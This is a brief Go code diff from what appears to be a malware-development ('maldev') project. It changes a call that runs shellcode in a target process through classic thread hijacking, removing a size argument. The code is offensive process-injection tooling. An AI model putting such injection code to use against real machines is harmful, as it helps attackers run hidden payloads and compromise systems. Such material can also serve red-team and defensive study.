@@ -44,7 +44,7 @@ func main() {
 	// Modify the thread
 	maldev.DebugWait("Modify Thread")
 
-	err = maldev.RunViaClassicThreadHijacking(pHandle, sc, maldev.SIZE_T(len(sc)))
+	err = maldev.RunViaClassicThreadHijacking(pHandle, sc)
 	if err != nil {
 		panic(err)
 	}
